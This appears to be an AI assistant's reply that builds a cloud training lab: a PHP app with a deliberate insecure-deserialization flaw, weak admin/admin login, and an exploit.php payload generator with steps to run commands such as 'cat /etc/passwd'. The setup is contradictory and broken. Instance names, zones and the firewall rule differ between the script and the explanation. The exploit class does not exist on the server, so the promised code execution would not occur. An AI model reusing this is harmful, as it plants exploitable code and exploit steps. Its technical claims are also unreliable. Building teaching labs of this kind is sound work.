Certainly! Below is a single shell script `setup_vulnerable_instance.sh` that will:

1. **Set Up a Google Cloud Instance**: Creates a fully updated and patched Ubuntu instance.
2. **Install Apache and PHP**: Sets up an Apache web server with PHP support.
3. **Deploy a Web Application**: Hosts a PHP application with a subtle and advanced vulnerability—**Insecure Deserialization leading to Remote Code Execution (RCE)**.
4. **Include Attack Solution Files**: Provides the exploit script and payloads needed to demonstrate the attack.

---

## **Script: `setup_vulnerable_instance.sh`**

```bash
#!/bin/bash

mkdir attack-6-php
cd attack-6-php

# Create the startup script
cat <<'EOF' > startup-script.sh
#!/bin/bash
# Update and upgrade the system
sudo apt-get update
sudo apt-get upgrade -y

# Install Apache and PHP
sudo apt-get install -y apache2 php libapache2-mod-php

# Enable mod_rewrite
sudo a2enmod rewrite

# Restart Apache to apply changes
sudo systemctl restart apache2

# Create the web application directory
sudo mkdir -p /var/www/html/vulnerable_app

# Set permissions
sudo chown -R www-data:www-data /var/www/html/vulnerable_app

# Create the vulnerable PHP application
sudo tee /var/www/html/vulnerable_app/index.php > /dev/null <<'EOPHP'
<?php
session_start();

// Simple authentication (credentials: admin/admin)
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if ($_POST['username'] === 'admin' && $_POST['password'] === 'admin') {
            $_SESSION['logged_in'] = true;
            header('Location: index.php');
            exit();
        } else {
            echo '<p>Invalid credentials</p>';
        }
    }
    echo '
    <form method="POST">
        Username: <input type="text" name="username" /><br/>
        Password: <input type="password" name="password" /><br/>
        <input type="submit" value="Login" />
    </form>';
    exit();
}

// Vulnerable functionality
if (isset($_GET['data'])) {
    $data = base64_decode($_GET['data']);
    $object = unserialize($data);
    if ($object instanceof Logger) {
        $object->log();
    }
}

class Logger {
    public $log_file = '/var/log/apache2/access.log';
    public function log() {
        $content = file_get_contents($this->log_file);
        echo "<pre>$content</pre>";
    }
}

// Safe serialization function (not used)
function safe_unserialize($data) {
    return unserialize($data, ['allowed_classes' => ['Logger']]);
}

// Main page content
echo '<h1>Welcome, Admin!</h1>';
echo '<p>This is a secure admin panel.</p>';
echo '<p><a href="?action=logout">Logout</a></p>';

if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    session_destroy();
    header('Location: index.php');
    exit();
}
EOPHP

# Set appropriate permissions
sudo chown www-data:www-data /var/www/html/vulnerable_app/index.php

# Configure Apache to serve the application
sudo tee /etc/apache2/sites-available/000-default.conf > /dev/null <<'EOAPACHE'
<VirtualHost *:80>
    DocumentRoot /var/www/html/vulnerable_app
    <Directory /var/www/html/vulnerable_app>
        AllowOverride All
        Require all granted
    </Directory>
</VirtualHost>
EOAPACHE

# Restart Apache to apply configuration
sudo systemctl restart apache2
EOF

# Create the Google Cloud instance with the startup script
gcloud compute instances create "attack-6-php" \
  --zone "asia-south2-a" \
  --machine-type "c2-standard-4" \
  --image-family "ubuntu-2004-lts" \
  --image-project "ubuntu-os-cloud" \
  --boot-disk-size "10GB" \
  --tags "http-server,attack-4-php" \
  --metadata-from-file startup-script=startup-script.sh \
  --metadata google-compute-default-timeout=600 \
  --maintenance-policy=TERMINATE \
  --provisioning-model=STANDARD \
  --instance-termination-action=DELETE \
  --max-run-duration=300s

# Create the attack solution files
cat <<'EOF' > exploit.php
<?php
class Exploit {
    public $cmd = 'id';
    public function __wakeup() {
        echo "<pre>" . shell_exec($this->cmd) . "</pre>";
    }
}

// Create a payload
$payload = base64_encode(serialize(new Exploit()));
echo "Use the following URL parameter:\n";
echo "?data=$payload\n";
?>
EOF

echo "Attack solution files created: exploit.php"
```

---

## **Explanation**

### **1. System Setup**

- **Instance Creation**: The script creates a Google Cloud Compute Engine instance named `vulnerable-instance` in the `us-central1-a` zone.
- **Firewall Configuration**: Allows incoming HTTP traffic on port `80` to the instance.
- **Startup Script**: Configures the instance upon creation by installing necessary software and deploying the vulnerable application.

### **2. Web Application**

- **Authentication**: A simple login system (`admin`/`admin`) to simulate a secure admin panel.
- **Vulnerability**: An **Insecure Deserialization** vulnerability in PHP due to the use of `unserialize()` on untrusted data from `$_GET['data']`.
  - **Context**: The application expects serialized `Logger` objects but does not enforce allowed classes.
  - **Exploit**: An attacker can inject a malicious serialized object that executes arbitrary code upon deserialization.
- **Safe Function (Unused)**: There's a `safe_unserialize()` function that correctly uses the `allowed_classes` option, but it's not used in the code, simulating a developer's oversight.

### **3. Attack Solution Files**

- **`exploit.php`**: A PHP script that generates a malicious serialized payload.
  - **`Exploit` Class**: Contains a `__wakeup()` magic method that executes arbitrary shell commands.
  - **Payload Generation**: Serializes the `Exploit` object and base64-encodes it for use in the URL.

---

## **Instructions**

### **1. Running the Script**

1. **Save the Script**: Save the script to a file named `setup_vulnerable_instance.sh`.

    ```bash
    nano setup_vulnerable_instance.sh
    ```

2. **Make the Script Executable**:

    ```bash
    chmod +x setup_vulnerable_instance.sh
    ```

3. **Execute the Script**:

    ```bash
    ./setup_vulnerable_instance.sh
    ```

    - The script will create the instance and set up the application.
    - Wait for a few minutes for the instance to be fully configured.

### **2. Accessing the Application**

1. **Find the External IP**:

    ```bash
    gcloud compute instances list
    ```

    - Note the external IP address of `vulnerable-instance`.

2. **Navigate to the Application**:

    - Open a web browser and go to `http://<EXTERNAL_IP>/`.

3. **Login to the Admin Panel**:

    - **Username**: `admin`
    - **Password**: `admin`

    - You should see a welcome message indicating access to the admin panel.

### **3. Demonstrating the Attack**

#### **a. Using the Provided Exploit Script**

1. **Ensure PHP is Installed Locally**:

    - The `exploit.php` script requires PHP to run.

    ```bash
    php -v
    ```

    - If not installed, install PHP:

    ```bash
    sudo apt-get install php
    ```

2. **Run the Exploit Script**:

    ```bash
    php exploit.php
    ```

    - The script will output a URL parameter to use.

    **Example Output**:

    ```plaintext
    Use the following URL parameter:
    ?data=Tzo4OiJFeHBsb2l0IjozOntzOjM6ImNtZCI7czozOiJpZCI7fQ==
    ```

3. **Construct the Malicious URL**:

    - Append the `?data=<payload>` parameter to the application URL.

    **Example URL**:

    ```plaintext
    http://<EXTERNAL_IP>/?data=Tzo4OiJFeHBsb2l0IjozOntzOjM6ImNtZCI7czozOiJpZCI7fQ==
    ```

4. **Access the Malicious URL**:

    - Visit the constructed URL in your web browser.
    - The application should execute the `id` command and display the output.

    **Expected Output**:

    ```plaintext
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```

#### **b. Customizing the Exploit**

- **Modify the Command**:

    - Edit `exploit.php` to change the `$cmd` variable to any arbitrary command, such as `ls`, `cat /etc/passwd`, etc.

    ```php
    public $cmd = 'cat /etc/passwd';
    ```

- **Generate a New Payload**:

    - Run `php exploit.php` again to generate a new payload.

- **Use the New Payload**:

    - Repeat the steps above with the new `?data=<payload>` parameter.

---

## **Vulnerability Explanation**

### **Insecure Deserialization in PHP**

- **Description**: The application uses `unserialize()` on user-supplied data without validation.
- **Impact**: Allows an attacker to inject a serialized object that, when unserialized, can execute arbitrary code.
- **Mechanism**:
  - PHP's `unserialize()` function can invoke magic methods like `__wakeup()` and `__destruct()`.
  - By crafting an object with malicious code in these methods, code execution can occur during deserialization.

### **Why It's Hard to Detect**

- **Subtlety**: The vulnerability is hidden in a less obvious part of the code (`$_GET['data']` parameter).
- **Authentication**: The application requires authentication, so only authenticated users can exploit it, reducing the attack surface.
- **False Sense of Security**: The presence of the unused `safe_unserialize()` function might mislead developers into thinking deserialization is handled securely.

---

## **Real-Life Simulation**

- **Fully Patched System**: The server uses up-to-date software with all security patches applied.
- **Strict Firewall Rules**: Only port `80` (HTTP) is open, simulating a production environment with minimal exposure.
- **Complex Vulnerability**: Insecure deserialization is an advanced vulnerability that requires in-depth knowledge to exploit.
- **No Obvious Indicators**: Standard vulnerability scanners may not detect this issue without specific tests for insecure deserialization.

---

## **Student Challenge**

- **Objective**: Discover and exploit the insecure deserialization vulnerability to execute arbitrary commands on the server.
- **Time Limit**: 3 hours to perform reconnaissance, identify the vulnerability, and develop an exploit.
- **Assessment Criteria**:
  - **Detection**: Ability to find the vulnerability through systematic testing.
  - **Exploitation**: Crafting a payload to exploit the vulnerability securely.
  - **Understanding**: Demonstrating knowledge of insecure deserialization and PHP object injection.
  - **Documentation**: Providing a detailed report of the methodology and findings.

---

## **Clean-Up Script: `delete.sh`**

After the demonstration, you can use the following script to delete the created resources.

```bash
#!/bin/bash

# Variables
INSTANCE_NAME="vulnerable-instance"
ZONE="us-central1-a"
FIREWALL_RULE="allow-http"

# Delete the Compute Engine instance
gcloud compute instances delete "$INSTANCE_NAME" \
  --zone "$ZONE" \
  --quiet

# Delete the firewall rule
gcloud compute firewall-rules delete "$FIREWALL_RULE" \
  --quiet

# Remove local files
rm -f startup-script.sh exploit.php setup_vulnerable_instance.sh delete.sh

echo "Cleanup complete."
```

- **Instructions**:
  - Save this script as `delete.sh`.
  - Make it executable: `chmod +x delete.sh`.
  - Run the script: `./delete.sh`.

---

## **Important Notes**

- **Ethical Use Only**: This setup is intended for educational purposes within a controlled environment.
- **Security**: Ensure that the instance is not left running unattended to prevent misuse.
- **Permissions**: The exploit demonstrates code execution as the `www-data` user, which has limited privileges.
- **Realism**: The scenario reflects real-world vulnerabilities found in web applications due to insecure coding practices.

---

## **Conclusion**

This setup provides a challenging and realistic environment for your students to practice advanced web exploitation techniques. By discovering and exploiting the insecure deserialization vulnerability, they will gain valuable experience in identifying subtle security flaws and understanding their implications.

---

**Let me know if you need further customization or assistance with any part of this setup!**